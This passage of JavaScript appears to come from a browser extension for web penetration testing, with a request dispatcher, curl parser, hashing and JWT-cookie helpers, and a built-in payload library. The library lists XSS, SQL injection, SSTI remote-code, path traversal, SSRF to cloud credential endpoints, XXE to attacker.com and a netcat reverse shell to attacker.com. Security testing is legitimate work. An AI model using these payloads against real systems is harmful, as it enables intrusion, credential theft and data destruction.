    const unixS = Math.floor(d.getTime() / 1000);
    const now = Date.now();
    const diff = d.getTime() - now;
    const abs = Math.abs(diff);
    const rel = abs < 5000       ? 'just now'
      : abs < 3600000  ? `${Math.round(abs / 60000)}m ${diff < 0 ? 'ago' : 'from now'}`
      : abs < 86400000 ? `${Math.round(abs / 3600000)}h ${diff < 0 ? 'ago' : 'from now'}`
      : `${Math.round(abs / 86400000)}d ${diff < 0 ? 'ago' : 'from now'}`;
    const rows = [
      ['Unix (s)',  String(unixS)],
      ['Unix (ms)', String(d.getTime())],
      ['ISO 8601',  d.toISOString()],
      ['UTC',       d.toUTCString()],
      ['Local',     d.toLocaleString()],
      ['Relative',  rel],
    ];
    out.innerHTML = rows.map(([label, value]) =>
      `<div class="ts-row">
        <span class="ts-label">${esc(label)}</span>
        <span class="ts-value">${esc(value)}</span>
        <button class="sm ts-copy-btn" data-val="${esc(value)}" title="Copy">Copy</button>
      </div>`
    ).join('');
  },
};

// ─── Diff ─────────────────────────────────────────────────────────────────────

function diffLines(aLines, bLines) {
  const m = aLines.length, n = bLines.length;
  const dp = Array.from({ length: m + 1 }, () => new Array(n + 1).fill(0));
  for (let i = m - 1; i >= 0; i--) {
    for (let j = n - 1; j >= 0; j--) {
      dp[i][j] = aLines[i] === bLines[j]
        ? dp[i + 1][j + 1] + 1
        : Math.max(dp[i + 1][j], dp[i][j + 1]);
    }
  }
  const result = [];
  let i = 0, j = 0;
  while (i < m || j < n) {
    if (i < m && j < n && aLines[i] === bLines[j]) {
      result.push({ type: 'eq',  val: aLines[i] }); i++; j++;
    } else if (i < m && (j >= n || dp[i + 1][j] >= dp[i][j + 1])) {
      result.push({ type: 'del', val: aLines[i] }); i++;
    } else {
      result.push({ type: 'add', val: bLines[j] }); j++;
    }
  }
  return result;
}

const Diff = {
  run() {
    const MAX = 500;
    let a = $('diff-a').value;
    let b = $('diff-b').value;
    if ($('diff-json').checked) {
      const pa = prettyJSON(a), pb = prettyJSON(b);
      if (pa) a = pa;
      if (pb) b = pb;
    }
    const aLines = a === '' ? [] : a.split('\n');
    const bLines = b === '' ? [] : b.split('\n');
    const statsEl = $('diff-stats');
    const out = $('diff-output');

    if (aLines.length > MAX || bLines.length > MAX) {
      out.innerHTML = `<div class="diff-line eq">Input exceeds ${MAX}-line limit per side</div>`;
      statsEl.classList.add('hidden');
      return;
    }

    const result = diffLines(aLines, bLines);
    let added = 0, removed = 0, lineA = 0, lineB = 0;
    const html = result.map(d => {
      let num, cls, sign;
      if (d.type === 'eq')  { lineA++; lineB++; num = lineA; cls = 'eq';  sign = ' '; }
      if (d.type === 'del') { lineA++;           num = lineA; cls = 'del'; sign = '-'; removed++; }
      if (d.type === 'add') {           lineB++; num = lineB; cls = 'add'; sign = '+'; added++; }
      return `<div class="diff-line ${cls}"><span class="diff-line-sign">${sign}</span><span class="diff-line-num">${num}</span><span>${esc(d.val)}</span></div>`;
    }).join('');

    out.innerHTML = html || '<div class="diff-line eq">(no input)</div>';
    if (added || removed) {
      statsEl.innerHTML = `<span class="diff-added">+${added} added</span>  <span class="diff-removed">-${removed} removed</span>`;
    } else {
      statsEl.innerHTML = 'Files are identical';
    }
    statsEl.classList.remove('hidden');
  },

  clear() {
    $('diff-a').value = '';
    $('diff-b').value = '';
    $('diff-output').innerHTML = '';
    $('diff-stats').classList.add('hidden');
  },
};

// ─── Curl parser ──────────────────────────────────────────────────────────────

function parseCurlCommand(raw) {
  const s = raw.replace(/\\\r?\n\s*/g, ' ').trim();

  function tokenize(str) {
    const tokens = [];
    let i = 0;
    while (i < str.length) {
      while (i < str.length && /[ \t]/.test(str[i])) i++;
      if (i >= str.length) break;
      let tok = '';
      while (i < str.length && !/[ \t]/.test(str[i])) {
        if (str[i] === "'") {
          i++;
          while (i < str.length) {
            if (str.slice(i, i + 4) === "'\\''" ) { tok += "'"; i += 4; }
            else if (str[i] === "'") { i++; break; }
            else tok += str[i++];
          }
        } else if (str[i] === '"') {
          i++;
          while (i < str.length && str[i] !== '"') {
            if (str[i] === '\\') { i++; tok += str[i++] || ''; }
            else tok += str[i++];
          }
          if (i < str.length) i++;
        } else if (str[i] === '\\') {
          i++; tok += str[i++] || '';
        } else {
          tok += str[i++];
        }
      }
      if (tok) tokens.push(tok);
    }
    return tokens;
  }

  const tokens = tokenize(s);
  let method = null;
  const headers = {};
  let body = null;
  let url = null;

  const SKIP_VAL = new Set(['-u', '-o', '-F', '--limit-rate', '--max-time',
    '--connect-timeout', '--cert', '--key', '--cacert', '-e', '--referer',
    '--proxy', '-x', '--user', '--output', '--upload-file', '-T']);

  let i = 0;
  if (tokens[i] === 'curl') i++;

  while (i < tokens.length) {
    let t = tokens[i];
    const eqIdx = t.startsWith('--') ? t.indexOf('=') : -1;
    if (eqIdx > 2) {
      tokens.splice(i + 1, 0, t.slice(eqIdx + 1));
      t = t.slice(0, eqIdx);
    }

    if (t === '-X' || t === '--request') {
      method = (tokens[++i] || '').toUpperCase();
    } else if (t === '-H' || t === '--header') {
      const hdr = tokens[++i] || '';
      const c = hdr.indexOf(':');
      if (c > 0) headers[hdr.slice(0, c).trim()] = hdr.slice(c + 1).trim();
    } else if (t === '-d' || t === '--data' || t === '--data-raw' || t === '--data-binary') {
      body = tokens[++i] || '';
    } else if (SKIP_VAL.has(t)) {
      i++;
    } else if (!t.startsWith('-') && !url) {
      url = t;
    }
    i++;
  }

  if (!method) method = body ? 'POST' : 'GET';
  return { method, url, headers, body };
}

// ─── Dispatch ─────────────────────────────────────────────────────────────────

const Dispatch = {
  loadCurrent() {
    const url = state.tabUrl || '';
    if (isHttpUrl(url)) $('dispatch-url').value = url;
    else toast('Navigate to a real http/https page first', 'warn');
  },

  parseHeaders(raw) {
    const text = String(raw || '').trim();
    if (!text) return {};
    if (text.startsWith('{')) {
      const parsed = JSON.parse(text);
      if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) throw new Error('Headers must use Name: value format');
      return parsed;
    }
    const headers = {};
    text.split(/\r?\n/).forEach((line, idx) => {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) return;
      const colon = trimmed.indexOf(':');
      if (colon <= 0) throw new Error(`Invalid header on line ${idx + 1}`);
      const name = trimmed.slice(0, colon).trim();
      const value = trimmed.slice(colon + 1).trim();
      if (!name) throw new Error(`Invalid header on line ${idx + 1}`);
      headers[name] = value;
    });
    return headers;
  },

  appendParamValue(value) {
    const current = $('dispatch-url').value.trim() || state.tabUrl;
    if (!isHttpUrl(current)) { toast('Set a URL first', 'error'); activateTab('dispatch'); return; }
    try {
      const url = new URL(current);
      const key = url.searchParams.has('q') ? 'payload' : 'q';
      url.searchParams.set(key, value);
      $('dispatch-url').value = url.href;
      activateTab('dispatch');
      toast('Payload added to URL', 'success');
    } catch (e) {
      toast(String(e), 'error');
    }
  },

  buildCurl() {
    const method = $('dispatch-method').value;
    const url = $('dispatch-url').value.trim();
    let headers = {};
    try { headers = this.parseHeaders($('dispatch-headers').value); } catch {}
    const body = $('dispatch-body').value;
    const q = s => `'${String(s).replace(/'/g, "'\\''")}'`;
    const parts = ['curl', '-i', '-X', q(method), q(url)];
    Object.entries(headers).forEach(([k, v]) => parts.push('-H', q(`${k}: ${v}`)));
    if (body && method !== 'GET' && method !== 'HEAD') parts.push('--data-raw', q(body));
    return parts.join(' ');
  },

  statusClass(code) {
    if (!code) return '';
    if (code < 300) return 'ok';
    if (code < 400) return 'redir';
    if (code < 500) return 'client';
    return 'server';
  },

  async send() {
    const method = $('dispatch-method').value;
    const url = $('dispatch-url').value.trim();
    if (!isHttpUrl(url)) { toast('Valid http/https URL required', 'error'); return; }
    let headers = {};
    try { headers = this.parseHeaders($('dispatch-headers').value); }
    catch (e) { toast(e.message || 'Headers must use Name: value format', 'error'); return; }
    const body = $('dispatch-body').value;
    const btn = $('dispatch-send');
    btn.disabled = true;
    btn.textContent = 'Sending…';
    const resp = await bg('FETCH', { url, method, headers, body, maxBody: 200000 }).catch(e => ({ error: String(e) }));
    btn.disabled = false;
    btn.textContent = 'Send';
    if (resp.error) { toast(`Request failed: ${resp.error}`, 'error'); return; }
    const badge = $('dispatch-status-badge');
    badge.textContent = `${resp.status} ${resp.statusText || ''}  •  ${resp.length} bytes`;
    badge.className = `dispatch-status-badge ${this.statusClass(resp.status)}`;
    badge.classList.remove('hidden');
    const headersText = Object.entries(resp.headers || {}).map(([k, v]) => `${k}: ${v}`).join('\n');
    const responseEl = $('dispatch-response');
    responseEl.classList.remove('muted');
    responseEl.innerHTML = headersText
      ? `<span class="dim">${esc(headersText)}</span>\n\n${esc(resp.body || '')}`
      : esc(resp.body || '');
  },

  clear() {
    $('dispatch-method').value = 'GET';
    $('dispatch-url').value = '';
    $('dispatch-headers').value = '';
    $('dispatch-body').value = '';
    const responseEl = $('dispatch-response');
    responseEl.classList.add('muted');
    responseEl.textContent = 'No response yet';
    const badge = $('dispatch-status-badge');
    badge.textContent = '';
    badge.classList.add('hidden');
  },
};

// ─── Hash ─────────────────────────────────────────────────────────────────────

function md5(str) {
  function safeAdd(x,y){const l=(x&0xFFFF)+(y&0xFFFF);return(((x>>16)+(y>>16)+(l>>16))<<16)|(l&0xFFFF);}
  function rol(n,s){return(n<<s)|(n>>>(32-s));}
  function cmn(q,a,b,x,s,t){return safeAdd(rol(safeAdd(safeAdd(a,q),safeAdd(x,t)),s),b);}
  function ff(a,b,c,d,x,s,t){return cmn((b&c)|(~b&d),a,b,x,s,t);}
  function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&~d),a,b,x,s,t);}
  function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
  function ii(a,b,c,d,x,s,t){return cmn(c^(b|~d),a,b,x,s,t);}
  function str2blks(s){
    const nb=((s.length+8)>>6)+1,blk=new Array(nb*16).fill(0);
    for(let i=0;i<s.length;i++) blk[i>>2]|=s.charCodeAt(i)<<((i%4)*8);
    blk[s.length>>2]|=0x80<<((s.length%4)*8);
    blk[nb*16-2]=s.length*8;
    return blk;
  }
  const x=str2blks(unescape(encodeURIComponent(str)));
  let [a,b,c,d]=[0x67452301,0xEFCDAB89,0x98BADCFE,0x10325476];
  for(let i=0;i<x.length;i+=16){
    const[aa,bb,cc,dd]=[a,b,c,d];
    a=ff(a,b,c,d,x[i+ 0], 7,-680876936); b=ff(d,a,b,c,x[i+ 1],12,-389564586);
    c=ff(c,d,a,b,x[i+ 2],17, 606105819); d=ff(b,c,d,a,x[i+ 3],22,-1044525330);
    a=ff(a,b,c,d,x[i+ 4], 7,-176418897); b=ff(d,a,b,c,x[i+ 5],12, 1200080426);
    c=ff(c,d,a,b,x[i+ 6],17,-1473231341);d=ff(b,c,d,a,x[i+ 7],22,-45705983);
    a=ff(a,b,c,d,x[i+ 8], 7, 1770035416);b=ff(d,a,b,c,x[i+ 9],12,-1958414417);
    c=ff(c,d,a,b,x[i+10],17,-42063);     d=ff(b,c,d,a,x[i+11],22,-1990404162);
    a=ff(a,b,c,d,x[i+12], 7, 1804603682);b=ff(d,a,b,c,x[i+13],12,-40341101);
    c=ff(c,d,a,b,x[i+14],17,-1502002290);d=ff(b,c,d,a,x[i+15],22, 1236535329);
    a=gg(a,b,c,d,x[i+ 1], 5,-165796510); b=gg(d,a,b,c,x[i+ 6], 9,-1069501632);
    c=gg(c,d,a,b,x[i+11],14, 643717713); d=gg(b,c,d,a,x[i+ 0],20,-373897302);
    a=gg(a,b,c,d,x[i+ 5], 5,-701558691); b=gg(d,a,b,c,x[i+10], 9, 38016083);
    c=gg(c,d,a,b,x[i+15],14,-660478335); d=gg(b,c,d,a,x[i+ 4],20,-405537848);
    a=gg(a,b,c,d,x[i+ 9], 5, 568446438); b=gg(d,a,b,c,x[i+14], 9,-1019803690);
    c=gg(c,d,a,b,x[i+ 3],14,-187363961); d=gg(b,c,d,a,x[i+ 8],20, 1163531501);
    a=gg(a,b,c,d,x[i+13], 5,-1444681467);b=gg(d,a,b,c,x[i+ 2], 9,-51403784);
    c=gg(c,d,a,b,x[i+ 7],14, 1735328473);d=gg(b,c,d,a,x[i+12],20,-1926607734);
    a=hh(a,b,c,d,x[i+ 5], 4,-378558);    b=hh(d,a,b,c,x[i+ 8],11,-2022574463);
    c=hh(c,d,a,b,x[i+11],16, 1839030562);d=hh(b,c,d,a,x[i+14],23,-35309556);
    a=hh(a,b,c,d,x[i+ 1], 4,-1530992060);b=hh(d,a,b,c,x[i+ 4],11, 1272893353);
    c=hh(c,d,a,b,x[i+ 7],16,-155497632); d=hh(b,c,d,a,x[i+10],23,-1094730640);
    a=hh(a,b,c,d,x[i+13], 4, 681279174); b=hh(d,a,b,c,x[i+ 0],11,-358537222);
    c=hh(c,d,a,b,x[i+ 3],16,-722521979); d=hh(b,c,d,a,x[i+ 6],23, 76029189);
    a=hh(a,b,c,d,x[i+ 9], 4,-640364487); b=hh(d,a,b,c,x[i+12],11,-421815835);
    c=hh(c,d,a,b,x[i+15],16, 530742520); d=hh(b,c,d,a,x[i+ 2],23,-995338651);
    a=ii(a,b,c,d,x[i+ 0], 6,-198630844); b=ii(d,a,b,c,x[i+ 7],10, 1127891415);
    c=ii(c,d,a,b,x[i+14],15,-1416354905);d=ii(b,c,d,a,x[i+ 5],21,-57434055);
    a=ii(a,b,c,d,x[i+12], 6, 1700485571);b=ii(d,a,b,c,x[i+ 3],10,-1894986606);
    c=ii(c,d,a,b,x[i+10],15,-1051523);   d=ii(b,c,d,a,x[i+ 1],21,-2054922799);
    a=ii(a,b,c,d,x[i+ 8], 6, 1873313359);b=ii(d,a,b,c,x[i+15],10,-30611744);
    c=ii(c,d,a,b,x[i+ 6],15,-1560198380);d=ii(b,c,d,a,x[i+13],21, 1309151649);
    a=ii(a,b,c,d,x[i+ 4], 6,-145523070); b=ii(d,a,b,c,x[i+11],10,-1120210379);
    c=ii(c,d,a,b,x[i+ 2],15, 718787259); d=ii(b,c,d,a,x[i+ 9],21,-343485551);
    a=safeAdd(a,aa);b=safeAdd(b,bb);c=safeAdd(c,cc);d=safeAdd(d,dd);
  }
  const h=n=>[n&0xFF,(n>>8)&0xFF,(n>>16)&0xFF,(n>>24)&0xFF].map(b=>b.toString(16).padStart(2,'0')).join('');
  return h(a)+h(b)+h(c)+h(d);
}

async function hashString(type, input) {
  if (type === 'md5') return md5(input);
  const alg = { sha1: 'SHA-1', sha256: 'SHA-256', sha384: 'SHA-384', sha512: 'SHA-512' }[type];
  const buf = await crypto.subtle.digest(alg, new TextEncoder().encode(input));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
}

function identifyHash(h) {
  const s = h.trim();
  const len = s.length;
  const isHex = /^[0-9a-f]+$/i.test(s);
  const isB64 = /^[A-Za-z0-9+/=]+$/.test(s);

  const candidates = [];
  if (isHex) {
    if (len === 32)  candidates.push('MD5', 'NTLM', 'MD4');
    if (len === 40)  candidates.push('SHA-1', 'MySQL 4.1', 'RipeMD-160');
    if (len === 56)  candidates.push('SHA-224');
    if (len === 64)  candidates.push('SHA-256', 'BLAKE2-256');
    if (len === 96)  candidates.push('SHA-384');
    if (len === 128) candidates.push('SHA-512', 'Whirlpool', 'BLAKE2-512');
    if (len === 8)   candidates.push('CRC-32', 'Adler-32');
    if (len === 16)  candidates.push('MD5 (half)', 'CRC-64');
  }
  if (isB64 && !isHex) {
    if (s.startsWith('$2') && s.length === 60) candidates.push('bcrypt');
    if (s.startsWith('{SHA}')) candidates.push('SHA-1 (LDAP)');
    if (s.startsWith('$6$')) candidates.push('SHA-512 crypt');
    if (s.startsWith('$5$')) candidates.push('SHA-256 crypt');
    if (s.startsWith('$1$')) candidates.push('MD5 crypt');
    if (s.startsWith('$apr1$')) candidates.push('MD5 APR');
  }
  if (!candidates.length) {
    if (/^[0-9a-f]+$/i.test(s)) candidates.push(`Hex (${len} chars)`);
    else candidates.push('Unknown / plaintext');
  }
  return candidates;
}

// ─── Context menu ─────────────────────────────────────────────────────────────

function showCtxMenu(x, y, source) {
  state.ctxSource = source;
  const m = $('ctx-menu');
  $('ctx-send-jwt').classList.toggle('hidden', !source?.canSendJwt);
  $('ctx-send-encode').classList.toggle('hidden', !source?.canSendEncode);
  $('ctx-copy-urlencoded').classList.toggle('hidden', !source?.canCopyUrlEncoded);
  m.classList.remove('hidden');
  const pad = 8;
  const maxLeft = window.innerWidth - m.offsetWidth - pad;
  const maxTop = window.innerHeight - m.offsetHeight - pad;
  const left = Math.max(pad, Math.min(x, maxLeft));
  const top = Math.max(pad, Math.min(y, maxTop));
  m.style.left = `${left}px`;
  m.style.top = `${top}px`;
}
function hideCtxMenu() {
  $('ctx-menu').classList.add('hidden');
  state.ctxSource = null;
}

function activateTab(tabName) {
  $$('.nav-btn').forEach(b => b.classList.remove('active'));
  $$('.tab-pane').forEach(p => { p.classList.remove('active'); p.classList.add('hidden'); });
  document.querySelector(`.nav-btn[data-tab="${tabName}"]`)?.classList.add('active');
  const pane = $(`tab-${tabName}`);
  if (pane) {
    pane.classList.remove('hidden');
    pane.classList.add('active');
  }
}

function getCtxValue() {
  const src = state.ctxSource;
  if (!src) return null;
  if (src.kind === 'cookie') {
    const c = state.cookiesCache[src.idx];
    return c?.value ?? null;
  }
  if (src.kind === 'storage') {
    const cache = src.storageType === 'local' ? state.localCache : state.sessionCache;
    return cache?.[src.key] ?? null;
  }
  if (src.kind === 'payload') return src.value;
  return null;
}

function ctxSendToEncode() {
  const value = getCtxValue();
  if (value == null) { toast('No value selected', 'error'); hideCtxMenu(); return; }
  activateTab('tools');
  $('encode-input').value = String(value);
  $('encode-output').value = '';
  document.getElementById('tools-encode')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
  toast('Value sent to Encode / Decode', 'success');
  hideCtxMenu();
}

// ─── JWT ↔ Cookie ─────────────────────────────────────────────────────────────

async function jwtSendToCookie() {
  const token = $('jwt-output').value.trim();
  if (!token) { toast('Forge token first', 'error'); return; }
  const c = state.jwtSourceCookie;
  if (!c) { toast('No source cookie', 'error'); return; }
  const cookie = buildCookieSetDetailsFromExisting(c, { value: token });
  const { error } = await bg('SET_COOKIE', { cookie });
  if (error) { toast(`Error: ${formatBgError(error)}`, 'error'); return; }
  state.jwtSourceCookie = { ...c, value: token };
  await Cookies.reloadAfterMutation();
  toast(`Cookie "${c.name}" updated`, 'success');
}

// ─── Payload Library ─────────────────────────────────────────────────────────

const PAYLOAD_CATS = [
  { cat: 'XSS', payloads: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '\'"><script>alert(1)</script>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<math><mtext></table><img src=1 onerror=alert(1)>',
    'javascript:alert(1)',
    '" onmouseover="alert(1)',
    '\';alert(1)//',
    '\\";alert(1)//',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
  ]},
  { cat: 'SQL Injection', payloads: [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=2 UNION SELECT username,password FROM users--",
    "' OR SLEEP(5)--",
    "1 WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; SELECT * FROM information_schema.tables--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' ORDER BY 1--",
    "' ORDER BY 100--",
  ]},
  { cat: 'SSTI', payloads: [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
    "{{7*'7'}}",
    '{{config}}',
    '{{self}}',
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
  ]},
  { cat: 'Path Traversal', payloads: [
    '../../../etc/passwd',
    '..\\..\\..\\Windows\\win.ini',
    '....//....//....//etc/passwd',
    '../../../etc/passwd%00',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '%252e%252e%252fetc%252fpasswd',
    '/etc/passwd',
    'C:\\Windows\\win.ini',
    'file:///etc/passwd',
    '/proc/self/environ',
    '/var/log/apache2/access.log',
    '....\/....\/....\/etc/passwd',
  ]},
  { cat: 'Command Injection', payloads: [
    '; ls',
    '| ls',
    '&& ls',
    '|| ls',
    '; id',
    '$(id)',
    '`id`',
    '; sleep 5',
    '| sleep 5',
    '; cat /etc/passwd',
    '%0a id',
    '%0a cat /etc/passwd',
    '$(cat /etc/passwd)',
    '& ping -c 5 127.0.0.1 &',
    '; nc -e /bin/sh attacker.com 4444',
  ]},
  { cat: 'Open Redirect', payloads: [
    '//evil.com',
    '//evil.com/',
    'https://evil.com',
    '//evil.com@trusted.com',
    '\\/\\/evil.com',
    '/%09/evil.com',
    '///evil.com',
    '//\tevil.com',
    '%2F%2Fevil.com',
    '//evil.com%23',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
  ]},
  { cat: 'XXE', payloads: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>',
    '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">%init;]><foo/>',
  ]},
  { cat: 'SSRF', payloads: [
    'http://127.0.0.1/',
    'http://localhost/',
    'http://0.0.0.0/',
    'http://[::1]/',
    'http://169.254.169.254/',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://100.100.100.200/latest/meta-data/',
    'dict://127.0.0.1:6379/',
    'file:///etc/passwd',
    'gopher://127.0.0.1:3306/',
    'http://0177.0.0.1/',
    'http://0x7f.0x0.0x0.0x1/',
  ]},
  { cat: 'GraphQL', payloads: [
    // Introspection
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{name kind}}}"}',
    '{"query":"{__type(name:\"Query\"){fields{name}}}"}',
    '{"operationName":"IntrospectionQuery","query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}}}","variables":{}}',
    '{"query":"\\n{__schema{types{name kind}}}"}',
    '{"query":"query IntrospectionQuery{schema:__schema{types{name kind}}}"}',
    '{"query":"query IntrospectionQuery{__schema{directives{name locations args{name type{name kind}}}}}"}',
    '{"query":"fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name}}}query IntrospectionQuery{__schema{types{name kind fields(includeDeprecated:true){name type{...TypeRef}}}}}"}',
    '{"query":"query IntrospectionQuery{\\u005f\\u005fschema{queryType{name}types{name kind}}}"}',
    // Auth bypass
    '{"query":"{__typename}"}',
    '{"query":"mutation{__typename}"}',
    // Field suggestion probing
    '{"query":"{users{id email password}}"}',
    '{"query":"{user(id:1){id email role password token}}"}',
    '{"query":"{me{id email role token apiKey}}"}',
    // Batching
    '[{"query":"{__typename}"},{"query":"{__typename}"}]',
    // Injection via argument
    '{"query":"{user(id:\"1 OR 1=1\"){id email}}"}',
    '{"query":"{user(id:\"1; DROP TABLE users;--\"){id}}"}',
    '{"query":"{search(q:\"<script>alert(1)</script>\"){results}}"}',
    // SSRF via query
    '{"query":"{import(url:\"http://169.254.169.254/latest/meta-data/\")}"}',
    // Depth/complexity DoS
    '{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}}}}"}',
    // Alias overload
    '{"query":"{a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename}"}',
    // Fragment cycle
    '{"query":"fragment f on Query{...f}{...f}"}',
    // Variables exfil
    '{"query":"query($id:ID!){user(id:$id){id email password role}}","variables":{"id":"1"}}',
  ]},
  { cat: 'GraphQL (GET)', payloads: [
    // Introspection
    '?query=%7B__schema%7Btypes%7Bname%7D%7D%7D',
    '?query=query+IntrospectionQuery%7B__schema%7BqueryType%7Bname%7DmutationType%7Bname%7Dtypes%7Bname+kind%7D%7D%7D',
    '?query=%7B__type(name%3A%22Query%22)%7Bfields%7Bname%7D%7D%7D',
    '?operationName=IntrospectionQuery&query=query+IntrospectionQuery%7B__schema%7BqueryType%7Bname%7DmutationType%7Bname%7DsubscriptionType%7Bname%7D%7D%7D&variables=%7B%7D',
    '?query=%0A%7B__schema%7Btypes%7Bname+kind%7D%7D%7D',
    '?query=query+IntrospectionQuery%7Bschema%3A__schema%7Btypes%7Bname+kind%7D%7D%7D',
    '?query=query+IntrospectionQuery%7B__schema%7Bdirectives%7Bname+locations+args%7Bname+type%7Bname+kind%7D%7D%7D%7D%7D',
    // Auth bypass
    '?query=%7B__typename%7D',
    '?query=mutation%7B__typename%7D',
    // Field suggestion probing
    '?query=%7Busers%7Bid+email+password%7D%7D',
    '?query=%7Buser(id%3A1)%7Bid+email+role+password+token%7D%7D',
    '?query=%7Bme%7Bid+email+role+token+apiKey%7D%7D',
    // Injection via argument
    '?query=%7Buser(id%3A%221+OR+1%3D1%22)%7Bid+email%7D%7D',
    '?query=%7Bsearch(q%3A%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22)%7Bresults%7D%7D',
    // SSRF
    '?query=%7Bimport(url%3A%22http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F%22)%7D',
    // Depth DoS
    '?query=%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7Ba%7B__typename%7D%7D%7D%7D%7D%7D%7D%7D%7D%7D%7D%7D%7D',
    // Alias overload
    '?query=%7Ba%3A__typename+b%3A__typename+c%3A__typename+d%3A__typename+e%3A__typename+f%3A__typename%7D',
    // Newline bypass
    '?query=%0A%7B__schema%7Btypes%7Bname%7D%7D%7D',
    // operationName bypass
    '?operationName=IntrospectionQuery&query=query+IntrospectionQuery+%7B__schema%7BqueryType%7Bname%7D%7D%7D',
  ]},
];

const Payloads = {
  filter: '',

  allCats() {
    const builtIns = PAYLOAD_CATS.filter(c => c.cat !== 'GraphQL (GET)');
    const builtInNames = new Set(builtIns.map(c => c.cat));
    const merged = builtIns.map(c => {
      const customPayloads = state.customPayloadCats
        .filter(g => g.cat === c.cat || (c.cat === 'GraphQL' && g.cat === 'GraphQL (GET)'))
        .flatMap(g => g.payloads || []);
      return { ...c, custom: false, customPayloads };
    });
    state.customPayloadCats
      .filter(c => !builtInNames.has(c.cat) && c.cat !== 'GraphQL (GET)')
      .forEach(c => merged.push({ ...c, payloads: [], custom: true, customPayloads: c.payloads || [] }));
    return merged;
  },

  graphQLPayloadMethod() {
    return state.payloadGraphQLMethod === 'GET' ? 'GET' : 'POST';
  },

  toGraphQLGetPayload(value) {
    if (String(value).startsWith('?')) return value;
    try {
      const parsed = JSON.parse(value);
      if (Array.isArray(parsed)) return '?query=' + encodeURIComponent(value);
      const params = new URLSearchParams();
      if (parsed.operationName) params.set('operationName', parsed.operationName);
      if (parsed.query) params.set('query', parsed.query);
      if (parsed.variables) params.set('variables', JSON.stringify(parsed.variables));
      if (parsed.extensions) params.set('extensions', JSON.stringify(parsed.extensions));
      if ([...params.keys()].length) return '?' + params.toString();
    } catch {}
    return '?query=' + encodeURIComponent(value);
  },

  displayValue(cat, value) {
    if (cat !== 'GraphQL' || this.graphQLPayloadMethod() !== 'GET') return value;
    return this.toGraphQLGetPayload(value);
  },

  async loadCustom() {
    const { customPayloadCats = [], payloadGroupOrders = {} } = await chrome.storage.local.get(['customPayloadCats', 'payloadGroupOrders']);
    state.customPayloadCats = customPayloadCats;
    state.payloadGroupOrders = payloadGroupOrders;
    this.renderCustomList();
  },

  async saveCustom() {
    const name = $('payload-custom-name').value.trim();
    const payloads = $('payload-custom-values').value.split('\n').map(s => s.trim()).filter(Boolean);
    if (!name || !payloads.length) { toast('Group name and payloads required', 'error'); return; }
    const existing = state.customPayloadCats.findIndex(c => c.cat === name);
    if (existing >= 0) state.customPayloadCats[existing] = { ...state.customPayloadCats[existing], payloads };
    else state.customPayloadCats.push({ id: Date.now(), cat: name, payloads });
    await chrome.storage.local.set({ customPayloadCats: state.customPayloadCats });
    $('payload-custom-name').value = '';
    $('payload-custom-values').value = '';
    this.renderCustomList();
    this.render();
    toast('Payload group saved', 'success');
  },

  async deleteCustom(id) {
    state.customPayloadCats = state.customPayloadCats.filter(c => c.id !== id);
    await chrome.storage.local.set({ customPayloadCats: state.customPayloadCats });
    this.renderCustomList();
    this.render();
    toast('Payload group deleted', 'success');
  },

  async addToGroup(cat, payload) {
    const value = payload.trim();
